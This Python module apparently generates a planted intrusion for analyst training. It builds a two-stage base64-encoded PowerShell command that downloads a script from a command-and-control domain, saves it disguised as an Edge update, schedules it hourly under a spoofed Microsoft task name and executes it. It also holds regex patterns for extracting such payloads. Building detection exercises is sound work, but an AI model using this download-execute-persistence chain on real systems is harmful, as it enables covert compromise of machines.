"""Two-stage PowerShell encoding used by the planted intrusion.

Stage 1 is a real-looking ``-enc`` argument (base64 of UTF-16LE). Stage 2 sits inside it as a
``FromBase64String`` call over plain UTF-8, so analysts decoding in ES|QL with FROM_BASE64
(which assumes UTF-8) can read the second stage directly.
"""
from __future__ import annotations

import base64
import re

from .org import C2_DOMAIN

_SYNC_URL = f"https://{C2_DOMAIN}/api/v2/sync"

STAGE2_SCRIPT = (
    f"$u = '{_SYNC_URL}'\n"
    "$w = New-Object Net.WebClient\n"
    "$w.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')\n"
    "$s = $w.DownloadString($u)\n"
    '$p = "$env:LOCALAPPDATA\\Microsoft\\EdgeUpdate\\update.ps1"\n'
    "Set-Content -Path $p -Value $s\n"
    "schtasks.exe /create /tn MicrosoftEdgeUpdateTaskCore /sc hourly /f /tr "
    '"powershell.exe -nop -w hidden -File $p"\n'
    "Invoke-Expression $s\n"
)

_B64 = r"[A-Za-z0-9+/]{20,}={0,2}"
_PATTERNS = (
    re.compile(rf"-enc(?:odedcommand)?\s+({_B64})", re.IGNORECASE),
    re.compile(rf"FromBase64String\('({_B64})'\)", re.IGNORECASE),
)


def stage2_command(script: str) -> str:
    b64 = base64.b64encode(script.encode("utf-8")).decode("ascii")
    return (
        'powershell.exe -nop -w hidden -c "IEX([Text.Encoding]::UTF8.GetString('
        f"[Convert]::FromBase64String('{b64}')))\""
    )


def stage1_command(launcher: str) -> str:
    b64 = base64.b64encode(launcher.encode("utf-16-le")).decode("ascii")
    return f"powershell.exe -nop -w hidden -enc {b64}"


def extract_b64(command_line: str) -> str:
    """Return the earliest base64 run (>=20 chars) after ``-enc`` or inside ``FromBase64String('...')``."""
    matches = [m for p in _PATTERNS if (m := p.search(command_line))]
    if not matches:
        raise ValueError(f"no base64 payload found in: {command_line!r}")
    return min(matches, key=lambda m: m.start()).group(1)
